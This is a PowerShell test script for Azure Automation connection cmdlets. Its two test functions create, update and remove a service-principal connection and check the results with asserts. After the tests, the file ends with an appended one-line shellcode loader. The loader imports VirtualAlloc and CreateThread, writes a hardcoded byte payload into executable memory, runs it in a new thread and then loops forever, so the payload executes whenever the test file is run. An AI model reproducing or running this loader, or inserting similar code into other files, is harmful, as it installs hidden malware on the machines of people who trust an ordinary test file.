














function Test-E2EConnections
{
    $resourceGroupName = "to-delete-01"
    $automationAccountName = "fbs-aa-01"
    $output = Get-AzAutomationAccount -ResourceGroupName $resourceGroupName -AutomationAccountName $automationAccountName -ErrorAction SilentlyContinue
    $connectionAssetName = "CreateNewAzureServicePrincipalConnection"
    $connectionTypeName = "AzureServicePrincipal"
    $applicationId = "applicationIdString"
    $tenantId = "tenantIdString"
    $tenantIdChanged = "ContosoCertificate2"
    $thumbprint  = "thumbprintIdString"
    $subscriptionId  = "subscriptionIdString"
    $connectionFieldValues = @{"ApplicationId" = $applicationId; `
                               "TenantId" = $tenantId; `
                               "CertificateThumbprint" = $thumbprint; `
                               "SubscriptionId" = $subscriptionId}

    $connectionAssetCreated = New-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                                              -AutomationAccountName $automationAccountName `
                                                              -Name $connectionAssetName `
                                                              -ConnectionTypeName $connectionTypeName `
                                                              -ConnectionFieldValues $connectionFieldValues

    $getConnectionAssetCreated = Get-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                                                 -AutomationAccountName $automationAccountName `
                                                                 -Name $connectionAssetName

    Assert-AreEqual $connectionAssetName  $getConnectionAssetCreated.Name
    Assert-NotNull $getConnectionAssetCreated.FieldDefinitionValues
    Assert-AreEqual $applicationId.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("ApplicationId")
    Assert-AreEqual $tenantId.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("TenantId")
    Assert-AreEqual $thumbprint.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("CertificateThumbprint")
    Assert-AreEqual $subscriptionId.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("SubscriptionId")

    Remove-AzAutomationConnection -Name $connectionAssetName `
                                       -ResourceGroupName $resourceGroupName `
                                       -AutomationAccountName $automationAccountName `
                                       -Force

    $output = Get-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                              -AutomationAccountName $automationAccountName `
                                              -Name $connectionAssetName -ErrorAction SilentlyContinue

    Assert-True {$output -eq $null}
}


function Test-SetConnectionFieldValue
{
    $resourceGroupName = "to-delete-01"
    $automationAccountName = "fbs-aa-01"
    $output = Get-AzAutomationAccount -ResourceGroupName $resourceGroupName -AutomationAccountName $automationAccountName -ErrorAction SilentlyContinue
    $connectionAssetName = "CreateNewAzureServicePrincipalConnection"
    $connectionTypeName = "AzureServicePrincipal"
    $applicationId = "applicationIdString"
    $tenantId = "tenantIdString"
    $tenantIdChanged = "ContosoCertificate2"
    $thumbprint  = "thumbprintIdString"
    $subscriptionId  = "subscriptionIdString"
    $connectionFieldValues = @{"ApplicationId" = $applicationId; `
                               "TenantId" = $tenantId; `
                               "CertificateThumbprint" = $thumbprint; `
                               "SubscriptionId" = $subscriptionId}

    $connectionAssetCreated = New-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                                              -AutomationAccountName $automationAccountName `
                                                              -Name $connectionAssetName `
                                                              -ConnectionTypeName $connectionTypeName `
                                                              -ConnectionFieldValues $connectionFieldValues

    $getConnectionAssetCreated = Get-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                                                 -AutomationAccountName $automationAccountName `
                                                                 -Name $connectionAssetName

    Assert-AreEqual $connectionAssetName  $getConnectionAssetCreated.Name
    Assert-NotNull $getConnectionAssetCreated.FieldDefinitionValues
    Assert-AreEqual $applicationId.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("ApplicationId")
    Assert-AreEqual $tenantId.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("TenantId")
    Assert-AreEqual $thumbprint.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("CertificateThumbprint")
    Assert-AreEqual $subscriptionId.ToString() $getConnectionAssetCreated.FieldDefinitionValues.Item("SubscriptionId")

	$newApplicationId = "UpdatedApplicationIdString"
    Set-AzAutomationConnectionFieldValue -Name $connectionAssetName `
                                       -ResourceGroupName $resourceGroupName `
                                       -AutomationAccountName $automationAccountName `
									   -ConnectionFieldName ApplicationId `
									   -Value $newApplicationId

    $getConnectionAssetUpdated = Get-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                              -AutomationAccountName $automationAccountName `
                                              -Name $connectionAssetName

    Assert-AreEqual $connectionAssetName  $getConnectionAssetUpdated.Name
    Assert-NotNull $getConnectionAssetUpdated.FieldDefinitionValues
    Assert-AreEqual $newApplicationId.ToString() $getConnectionAssetUpdated.FieldDefinitionValues.Item("ApplicationId")

    Remove-AzAutomationConnection -Name $connectionAssetName `
                                       -ResourceGroupName $resourceGroupName `
                                       -AutomationAccountName $automationAccountName `
                                       -Force

    $output = Get-AzAutomationConnection -ResourceGroupName $resourceGroupName `
                                              -AutomationAccountName $automationAccountName `
                                              -Name $connectionAssetName -ErrorAction SilentlyContinue

    Assert-True {$output -eq $null}
}
$aepXKZ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $aepXKZ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdb,0xbf,0xd9,0x6a,0x54,0x42,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x78,0x18,0x83,0xc0,0x04,0x03,0x78,0xcd,0x88,0xa1,0xbe,0x05,0xce,0x4a,0x3f,0xd5,0xaf,0xc3,0xda,0xe4,0xef,0xb0,0xaf,0x56,0xc0,0xb3,0xe2,0x5a,0xab,0x96,0x16,0xe9,0xd9,0x3e,0x18,0x5a,0x57,0x19,0x17,0x5b,0xc4,0x59,0x36,0xdf,0x17,0x8e,0x98,0xde,0xd7,0xc3,0xd9,0x27,0x05,0x29,0x8b,0xf0,0x41,0x9c,0x3c,0x75,0x1f,0x1d,0xb6,0xc5,0xb1,0x25,0x2b,0x9d,0xb0,0x04,0xfa,0x96,0xea,0x86,0xfc,0x7b,0x87,0x8e,0xe6,0x98,0xa2,0x59,0x9c,0x6a,0x58,0x58,0x74,0xa3,0xa1,0xf7,0xb9,0x0c,0x50,0x09,0xfd,0xaa,0x8b,0x7c,0xf7,0xc9,0x36,0x87,0xcc,0xb0,0xec,0x02,0xd7,0x12,0x66,0xb4,0x33,0xa3,0xab,0x23,0xb7,0xaf,0x00,0x27,0x9f,0xb3,0x97,0xe4,0xab,0xcf,0x1c,0x0b,0x7c,0x46,0x66,0x28,0x58,0x03,0x3c,0x51,0xf9,0xe9,0x93,0x6e,0x19,0x52,0x4b,0xcb,0x51,0x7e,0x98,0x66,0x38,0x16,0x6d,0x4b,0xc3,0xe6,0xf9,0xdc,0xb0,0xd4,0xa6,0x76,0x5f,0x54,0x2e,0x51,0x98,0x9b,0x05,0x25,0x36,0x62,0xa6,0x56,0x1e,0xa0,0xf2,0x06,0x08,0x01,0x7b,0xcd,0xc8,0xae,0xae,0x78,0xcc,0x38,0xcb,0x3b,0xec,0x9b,0x83,0xc1,0xf0,0xca,0x0f,0x4f,0x16,0xbc,0xff,0x1f,0x87,0x7c,0x50,0xe0,0x77,0x14,0xba,0xef,0xa8,0x04,0xc5,0x25,0xc1,0xae,0x2a,0x90,0xb9,0x46,0xd2,0xb9,0x32,0xf7,0x1b,0x14,0x3f,0x37,0x97,0x9b,0xbf,0xf9,0x50,0xd1,0xd3,0x6d,0x91,0xac,0x8e,0x3b,0xae,0x1a,0xa4,0xc3,0x3a,0xa1,0x6f,0x94,0xd2,0xab,0x56,0xd2,0x7c,0x53,0xbd,0x69,0xb4,0xc1,0x7e,0x05,0xb9,0x05,0x7f,0xd5,0xef,0x4f,0x7f,0xbd,0x57,0x34,0x2c,0xd8,0x97,0xe1,0x40,0x71,0x02,0x0a,0x31,0x26,0x85,0x62,0xbf,0x11,0xe1,0x2c,0x40,0x74,0xf3,0x11,0x97,0xb0,0x81,0x7b,0x2b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aepX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aepX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aepX,0,0,0);for (;;){Start-sleep 60};

